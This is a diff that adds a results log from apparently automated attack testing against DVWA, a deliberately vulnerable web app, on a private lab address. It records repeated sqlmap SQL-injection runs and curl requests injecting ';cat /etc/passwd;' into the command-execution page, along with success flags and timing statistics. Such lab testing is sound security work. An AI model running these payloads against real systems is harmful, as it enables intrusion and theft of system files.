@@ -1,0 +1,66 @@
+stage, time, command, result, success
+stage, time, command, result, success
+stage, time, command, result, success
+3,6.864864349365234,sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/sqlmap_out_20210715_040508> ./results/20210715/os_out_sql_20210715_040508,./results/20210715/sqlmap_out_20210715_040508/192.168.40.132/log,False
+3,0.04595518112182617,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_040515,False
+stage, time, command, result, success
+3,6.525447845458984,sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/sqlmap_out_20210715_040849> ./results/20210715/os_out_sql_20210715_040849,./results/20210715/sqlmap_out_20210715_040849/192.168.40.132/log,False
+3,0.045430898666381836,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_040856,False
+stage, time, command, result, success
+stage, time, command, result, success
+3,0.05721473693847656,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_041703,False
+stage, time, command, result, success
+3,0.043477773666381836,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_041723,False
+..............
+[{'stage': 3, 'time': 0.043477773666381836, 'settings': 'curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low"', 'result_file': './results/20210715/testing_phases_separately/exec_pw_out_20210715_041723', 'success': False}]
+..............
+stage, time, command, result, success
+3,0.05440258979797363,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_041743,False
+..............
+[{'stage': 3, 'time': 0.05440258979797363, 'settings': 'curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low"', 'result_file': './results/20210715/testing_phases_separately/exec_pw_out_20210715_041743', 'success': False}]
+..............
+stage, time, command, result, success
+3,0.0471196174621582,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_041900,False
+..............
+[{'stage': 3, 'time': 0.0471196174621582, 'settings': 'curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low"', 'result_file': './results/20210715/testing_phases_separately/exec_pw_out_20210715_041900', 'success': False}]
+..............
+Scans Launched, Sucesses, Average TTS
+1,0,-1
+stage, time, command, result, success
+3,0.037949323654174805,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_042110,False
+..............
+[{'stage': 3, 'time': 0.037949323654174805, 'settings': 'curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=4f3a94b7e8f50b837dd312c09a41ec1b;security=low"', 'result_file': './results/20210715/testing_phases_separately/exec_pw_out_20210715_042110', 'success': False}]
+..............
+Scans Launched, Sucesses, Average TTS
+1,0,-1
+stage, time, command, result, success
+3,0.04590892791748047,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_043142,True
+Scans Launched, Sucesses, Average TTS
+1,1,0.04590892791748047
+stage, time, command, result, success
+3,16.13361430168152,sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/testing_phases_separately/sqlmap_out_20210715_043339> ./results/20210715/testing_phases_separately/os_out_sql_20210715_043339,./results/20210715/testing_phases_separately/sqlmap_out_20210715_043339/192.168.40.132/log,True
+Scans Launched, Sucesses, Average TTS
+1,1,16.13361430168152
+stage, time, command, result, success
+3,16.30730700492859,sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/testing_phases_separately/sqlmap_out_20210715_043539> ./results/20210715/testing_phases_separately/os_out_sql_20210715_043539,./results/20210715/testing_phases_separately/sqlmap_out_20210715_043539/192.168.40.132/log,True
+3,0.03768181800842285,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_043555,True
+Scans Launched, Sucesses, Average TTS
+1,1,8.172494411468506
+stage, time, command, result, success
+3,4.841120004653931,sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/brute/?username=1&Submit=Submit" --cookie="PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/testing_phases_separately/sqlmap_out_20210715_043628> ./results/20210715/testing_phases_separately/os_out_sql_20210715_043628,./results/20210715/testing_phases_separately/sqlmap_out_20210715_043628/192.168.40.132/log,False
+3,16.043841123580933,sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/testing_phases_separately/sqlmap_out_20210715_043632> ./results/20210715/testing_phases_separately/os_out_sql_20210715_043632,./results/20210715/testing_phases_separately/sqlmap_out_20210715_043632/192.168.40.132/log,True
+3,0.03733086585998535,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_043649,True
+Scans Launched, Sucesses, Average TTS
+1,1,8.040585994720459
+stage, time, command, result, success
+3,5.03840970993042,sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/brute/?username=1&Submit=Submit" --cookie="PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/testing_phases_separately/sqlmap_out_20210715_043847> ./results/20210715/testing_phases_separately/os_out_sql_20210715_043847,./results/20210715/testing_phases_separately/sqlmap_out_20210715_043847/192.168.40.132/log,False
+3,16.532560348510742,sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/testing_phases_separately/sqlmap_out_20210715_043852> ./results/20210715/testing_phases_separately/os_out_sql_20210715_043852,./results/20210715/testing_phases_separately/sqlmap_out_20210715_043852/192.168.40.132/log,True
+3,0.03943204879760742,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_043908,True
+3,5.119505405426025,sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/brute/?username=1&Submit=Submit" --cookie="PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/testing_phases_separately/sqlmap_out_20210715_043908> ./results/20210715/testing_phases_separately/os_out_sql_20210715_043908,./results/20210715/testing_phases_separately/sqlmap_out_20210715_043908/192.168.40.132/log,False
+3,16.481889009475708,sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/testing_phases_separately/sqlmap_out_20210715_043913> ./results/20210715/testing_phases_separately/os_out_sql_20210715_043913,./results/20210715/testing_phases_separately/sqlmap_out_20210715_043913/192.168.40.132/log,True
+3,0.04153728485107422,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_043930,True
+3,5.269906997680664,sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/brute/?username=1&Submit=Submit" --cookie="PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/testing_phases_separately/sqlmap_out_20210715_043930> ./results/20210715/testing_phases_separately/os_out_sql_20210715_043930,./results/20210715/testing_phases_separately/sqlmap_out_20210715_043930/192.168.40.132/log,False
+3,16.753750562667847,sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/testing_phases_separately/sqlmap_out_20210715_043935> ./results/20210715/testing_phases_separately/os_out_sql_20210715_043935,./results/20210715/testing_phases_separately/sqlmap_out_20210715_043935/192.168.40.132/log,True
+3,0.03023362159729004,curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=a19b40f1a0990ebb65ce90eb3759ed1c;security=low",./results/20210715/testing_phases_separately/exec_pw_out_20210715_043952,True
+Scans Launched, Sucesses, Average TTS
+3,3,8.313233812650045
